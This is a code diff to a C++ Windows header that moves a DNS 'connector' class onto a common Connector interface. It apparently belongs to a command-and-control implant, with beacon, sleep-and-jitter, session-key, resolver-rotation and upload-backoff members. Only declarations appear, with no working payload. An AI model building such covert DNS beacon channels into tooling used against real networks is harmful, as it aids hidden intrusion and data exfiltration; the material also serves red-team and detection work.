@@ -3,6 +3,7 @@
 #include "AgentConfig.h"
 #include <windows.h>
 #include <wininet.h>
+#include "Connector.h"
 
 #define DECL_API(x) decltype(x) * x
 
@@ -54,7 +55,7 @@ typedef struct _DNS_META_V1 {
 } DNS_META_V1, * PDNS_META_V1;
 #pragma pack(pop)
 
-class ConnectorDNS
+class ConnectorDNS : public Connector
 {
 public:
     // Constants
@@ -151,6 +152,15 @@ private:
     static const ULONG kQueryBufferSize = 4096;
     static const ULONG kRespBufferSize = 4096;
 
+    BYTE* pendingUpload = NULL;
+    ULONG pendingUploadSize = 0;
+    ULONG uploadBackoffMs = 0;
+    ULONG nextUploadAttemptTick = 0;
+
+    ULONG nextForcePollTick = 0;
+
+    BOOL lastExchangeHadData = FALSE;
+
     // Private helper methods
     BOOL  InitWSA();
     void  CleanupWSA();
@@ -183,39 +193,33 @@ private:
     BOOL  BuildDnsWireQuery(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outLen);
     BOOL  ParseDnsWireResponse(BYTE* response, ULONG respLen, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
 
+    void  SendData(BYTE* data, ULONG data_size);
+
+    void  UpdateResolvers(BYTE* resolvers);
+    void  UpdateBurstConfig(ULONG enabled, ULONG sleepMs, ULONG jitterPct);
+    void  GetBurstConfig(ULONG* enabled, ULONG* sleepMs, ULONG* jitterPct);
+    void  UpdateSleepDelay(ULONG sleepSeconds);
+    void  ResetTrafficTotals() { lastUpTotal = 0; lastDownTotal = 0; }
+    BOOL  IsBusy() const;
+    void  ForcePollOnce() { this->forcePoll = TRUE; }
+    BOOL  IsForcePollPending() const { return this->forcePoll; }
+    BOOL  WasLastQueryOk() const { return lastQueryOk; }
+    const BYTE* GetResolvers() const { return profile.resolvers; }
+    BOOL  QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
+    BOOL  QueryUdpWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
+
 public:
     ConnectorDNS();
     ~ConnectorDNS();
 
-    BOOL SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize, ULONG sleepDelaySeconds);
-    void CloseConnector();
+    BOOL SetProfile(void* profile, BYTE* beat, ULONG beatSize) override;
+    void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) override;
+    void Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput) override;
+    void CloseConnector() override;
 
-    void  SendData(BYTE* data, ULONG data_size);
-    BYTE* RecvData();
-    int   RecvSize();
-    void  RecvClear();
-
-    ULONG GetLastUpTotal() const { return lastUpTotal; }
-    ULONG GetLastDownTotal() const { return lastDownTotal; }
-    void  ResetTrafficTotals() { lastUpTotal = 0; lastDownTotal = 0; }
-
-    BOOL  WasLastQueryOk() const { return lastQueryOk; }
-
-    const BYTE* GetResolvers() const { return profile.resolvers; }
-    void        UpdateResolvers(BYTE* resolvers);
-
-    void  UpdateBurstConfig(ULONG enabled, ULONG sleepMs, ULONG jitterPct);
-    void  GetBurstConfig(ULONG* enabled, ULONG* sleepMs, ULONG* jitterPct);
-    void  UpdateSleepDelay(ULONG sleepSeconds);
-
-    BOOL  IsBusy() const;
-    ULONG GetDownAckOffset() const { return downAckOffset; }
-
-    BOOL  QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
-    BOOL  QueryUdpWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
-
-    void  ForcePollOnce() { this->forcePoll = TRUE; }
-    BOOL  IsForcePollPending() const { return this->forcePoll; }
+    BYTE* RecvData() override;
+    int   RecvSize() override;
+    void  RecvClear() override;
 
     static void* operator new(size_t sz);
     static void operator delete(void* p) noexcept;
